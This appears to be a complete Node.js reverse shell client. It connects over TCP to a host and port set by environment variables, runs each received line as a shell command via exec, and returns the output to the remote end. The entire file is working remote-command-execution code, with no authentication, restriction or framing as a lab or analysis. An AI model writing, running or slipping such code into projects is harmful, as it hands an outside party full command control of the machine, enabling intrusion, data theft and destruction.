const net = require('net');
const { exec } = require('child_process');

// Port to connect to. Defaults to 8080
const PORT = process.env.PORT || 8080;

// Host to connect to. Defaults to localhost
const HOST = process.env.HOST || 'localhost';

// Create a TCP socket client
const socket = net.createConnection(PORT, HOST);

// Print any error on client console for debugging
socket.on('error', error => process.stderr.write(JSON.stringify(error, null, '\t')));

socket.on('data', (response) => {
  const command = String(response).replace('\n', '');
  if (!command) { return; }

  const childProcess = exec(command);

  childProcess.stdout.on('data', (data) => {
    socket.write(`\n\tstdout:\n ${data}\n`);
  });

  childProcess.stderr.on('data', (data) => {
    socket.write(`\n\tstderr:\n${data}\n`);
  });

  childProcess.on('close', (code) => {
    socket.write(`\n\tclose:\n "${command}" exited with code ${code}\n`);
  });
});
